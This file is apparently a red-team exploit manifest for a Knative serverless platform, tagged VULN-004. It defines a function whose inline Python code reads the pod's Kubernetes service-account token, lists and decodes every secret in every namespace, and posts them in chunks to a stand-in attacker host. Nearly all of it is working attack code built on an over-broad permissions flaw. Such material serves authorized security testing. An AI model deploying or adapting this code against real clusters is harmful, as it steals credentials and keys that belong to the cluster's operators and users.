# VULN-004: RBAC Privilege Escalation - Steal All Secrets
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit exploits the cluster-wide secrets access to
# exfiltrate all secrets from all namespaces.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-004-steal-all-secrets
  labels:
    redteam: "true"
    exploit: "vuln-004"
    target: "secrets"
  annotations:
    redteam.knative.io/description: "Exfiltrate all cluster secrets"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import base64
        import urllib.request
        
        K8S_API = "https://kubernetes.default.svc"
        TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        
        def handler(event):
            """Exfiltrate all secrets from all namespaces"""
            try:
                with open(TOKEN_PATH, 'r') as f:
                    token = f.read().strip()
                
                ssl_context = ssl.create_default_context()
                ssl_context.load_verify_locations(CA_PATH)
                
                # Get ALL secrets (cluster-wide)
                url = f"{K8S_API}/api/v1/secrets"
                
                req = urllib.request.Request(url)
                req.add_header('Authorization', f'Bearer {token}')
                
                with urllib.request.urlopen(req, context=ssl_context) as response:
                    all_secrets = json.loads(response.read())
                
                # Extract and decode secrets
                extracted = []
                for secret in all_secrets.get('items', []):
                    secret_data = {}
                    for key, value in secret.get('data', {}).items():
                        try:
                            secret_data[key] = base64.b64decode(value).decode('utf-8')
                        except:
                            secret_data[key] = value  # Keep encoded if decode fails
                    
                    extracted.append({
                        'namespace': secret['metadata']['namespace'],
                        'name': secret['metadata']['name'],
                        'type': secret.get('type', 'unknown'),
                        'data': secret_data
                    })
                
                # Exfiltrate to attacker
                # Chunk if too large
                chunk_size = 50
                for i in range(0, len(extracted), chunk_size):
                    chunk = extracted[i:i+chunk_size]
                    payload = json.dumps({
                        'chunk': i // chunk_size,
                        'secrets': chunk
                    }).encode('utf-8')
                    
                    exfil_req = urllib.request.Request(
                        'http://attacker.example.com/collect/secrets',
                        data=payload,
                        headers={'Content-Type': 'application/json'}
                    )
                    urllib.request.urlopen(exfil_req, timeout=30)
                
                return {
                    "status": "secrets_exfiltrated",
                    "total_secrets": len(extracted)
                }
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
